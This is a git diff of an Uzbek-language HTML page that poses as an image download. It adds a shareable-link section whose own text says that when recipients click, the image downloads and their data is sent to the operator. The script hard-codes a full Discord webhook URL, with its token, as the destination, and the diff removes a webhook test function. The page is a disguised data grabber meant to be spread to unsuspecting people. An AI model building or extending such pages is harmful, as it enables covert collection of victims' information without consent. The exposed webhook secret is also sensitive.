@@ -76,6 +76,51 @@
             margin: 40px 0;
         }
         
+        .copy-section {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 25px;
+            margin: 20px 0;
+        }
+        
+        .copy-section h3 {
+            color: #5a0fb9;
+            margin-bottom: 15px;
+            font-size: 1.4rem;
+            text-align: center;
+        }
+        
+        .link-container {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        
+        .link-input {
+            flex: 1;
+            padding: 12px 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 16px;
+            background: white;
+        }
+        
+        .copy-btn {
+            background: linear-gradient(135deg, #5a0fb9 0%, #1c6df2 100%);
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+        
+        .copy-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(90, 15, 185, 0.4);
+        }
+        
         .download-link {
             display: inline-block;
             background: linear-gradient(135deg, #5a0fb9 0%, #1c6df2 100%);
@@ -87,6 +132,7 @@
             font-size: 1.2rem;
             transition: all 0.3s;
             box-shadow: 0 5px 15px rgba(90, 15, 185, 0.4);
+            margin: 10px 0;
         }
         
         .download-link:hover {
@@ -206,6 +252,10 @@
                 padding: 12px 30px;
                 font-size: 1rem;
             }
+            
+            .link-container {
+                flex-direction: column;
+            }
         }
     </style>
 </head>
@@ -221,8 +271,18 @@
                 <img src="image.jpg" alt="Namuna Rasm" id="previewImage" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNjAwIiBoZWlnaHQ9IjQwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICA8cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSIjZjBmMGYwIi8+CiAgPHRleHQgeD0iNTAlIiB5PSI1MCUiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIyNCIgZmlsbD0iIzMzMyIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZHk9Ii4zZW0iPlJhc20gTmFtbmEgKGltYWdlLmpwZyk8L3RleHQ+Cjwvc3ZnPg=='">
             </div>
             
-            <div class="download-section">
-                <a href="#" class="download-link" id="downloadLink">Rasmni Yuklab Olish</a>
+            <div class="copy-section">
+                <h3>Tayyor Link</h3>
+                <p>Quyidagi linkni nusxalab, boshqalarga yuboring. Ular linkni bosganda rasm yuklanadi va ularning ma'lumotlari bizga yuboriladi.</p>
+                
+                <div class="link-container">
+                    <input type="text" class="link-input" id="shareableLink" value="https://example.com/download-image" readonly>
+                    <button class="copy-btn" id="copyBtn">Nusxalash</button>
+                </div>
+                
+                <div class="download-section">
+                    <a href="#" class="download-link" id="downloadLink">Rasmni Yuklab Olish</a>
+                </div>
             </div>
             
             <div id="statusMessage" class="status"></div>
@@ -265,8 +325,12 @@
     </div>
 
     <script>
-        // Discord Webhook URL - O'zingizning webhook URL'ingizni qo'ying
+        // Discord Webhook URL
         const webhookURL = "https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI";
+        
+        // Joriy sahifa URL ni olish (tayyor link uchun)
+        const currentPageURL = window.location.href;
+        document.getElementById('shareableLink').value = currentPageURL;
         
         // Status xabarini ko'rsatish
         function showStatus(message, type) {
@@ -279,6 +343,21 @@
                 statusElement.style.display = 'none';
             }, 5000);
         }
+        
+        // Linkni nusxalash
+        document.getElementById('copyBtn').addEventListener('click', function() {
+            const linkInput = document.getElementById('shareableLink');
+            linkInput.select();
+            linkInput.setSelectionRange(0, 99999); // Mobile uchun
+            
+            navigator.clipboard.writeText(linkInput.value)
+                .then(() => {
+                    showStatus('✅ Link nusxalandi! Endi boshqalarga yuborishingiz mumkin.', 'success');
+                })
+                .catch(err => {
+                    showStatus('❌ Linkni nusxalashda xatolik: ' + err, 'error');
+                });
+        });
         
         // Link bosilganda ishlaydigan funksiya
         document.getElementById('downloadLink').addEventListener('click', function(e) {
@@ -550,33 +629,10 @@
             );
         }
 
-        // Test funksiyasi - webhook ishlayotganini tekshirish
-        function testWebhook() {
-            const testMessage = {
-                content: "🔧 **TEST XABAR**\nWebhook ishlayaptimi?"
-            };
-            
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(testMessage)
-            })
-            .then(response => {
-                if (response.ok) {
-                    showStatus('✅ Webhook ishlayapti!', 'success');
-                } else {
-                    showStatus('❌ Webhook ishlamayapti', 'error');
-                }
-            })
-            .catch(error => {
-                showStatus('❌ Webhook xatosi: ' + error.message, 'error');
-            });
-        }
-
-        // Sahifa yuklanganda webhookni test qilish
+        // Sahifa yuklanganda
         document.addEventListener('DOMContentLoaded', function() {
             console.log("Sahifa yuklandi. Webhook URL: ", webhookURL);
-            // testWebhook(); // Webhookni test qilish uchun bu qatorni oching
+            console.log("Tayyor link: ", currentPageURL);
         });
     </script>
 </body>
